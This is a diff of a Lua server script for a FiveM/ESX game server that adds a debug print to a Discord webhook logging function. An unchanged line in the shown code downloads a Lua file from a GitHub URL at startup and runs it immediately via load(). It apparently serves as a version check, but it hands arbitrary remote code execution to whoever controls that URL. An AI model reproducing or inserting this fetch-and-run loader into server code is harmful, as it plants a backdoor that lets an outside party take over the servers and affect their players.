@@ -1,6 +1,9 @@
 function logs(msg, canal, cor)
 	local corfinal = tonumber(cor:gsub("#",""),16)
 	PerformHttpRequest(canal, function(err, text, headers) end, 'POST', json.encode({username = 'ESX Developer Scripts', embeds = {{["color"] = corfinal, ["author"] = {["name"] = 'Esx Developer Portugal', ["icon_url"] = 'https://cdn.discordapp.com/attachments/878328503148355584/880839161924448256/FiveM-Logo2.png'}, ["description"] = msg, ["footer"] = {["text"] = "Esx Developer Portugal - "..os.date("%x %X %p"),["icon_url"] = "https://cdn.discordapp.com/attachments/878328503148355584/880839161924448256/FiveM-Logo2.png",},}}, avatar_url = 'https://cdn.discordapp.com/attachments/878328503148355584/880839161924448256/FiveM-Logo2.png'}), { ['Content-Type'] = 'application/json' })
+	if Config.LogDebug then
+		print(msg)
+	end
 end
 
 PerformHttpRequest('https://raw.githubusercontent.com/zcmg/versao/main/check.lua', function(code, res, headers) s = load(res) print(s()) end,'GET')
@@ -46,6 +49,7 @@ function criar_admin(source)
 		TriggerClientEvent('ox_lib:notify', source, { type = 'success', description = 'Admin adicionado a lista de admins'})
 	end
 end
+
 
 lib.callback.register('zcmg_recompensa:item_label', function(source, item)
 	return ESX.GetItemLabel(item)
